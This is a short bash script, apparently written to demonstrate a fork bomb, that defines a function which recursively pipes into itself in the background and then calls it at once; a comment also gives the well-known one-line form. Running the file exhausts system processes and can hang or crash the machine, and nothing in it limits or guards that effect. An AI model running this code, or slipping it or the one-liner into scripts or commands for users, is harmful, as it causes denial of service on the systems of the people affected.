#!/usr/bin/env bash 



# Define The Function
bomb() {
	# Call the Function inside its self and pass it to its self again and send it to the background
	bomb | bomb &
}
# Call the fork bomb to start the forking process
bomb


#  Normaly seen as this expression
#  :(){:|:&};: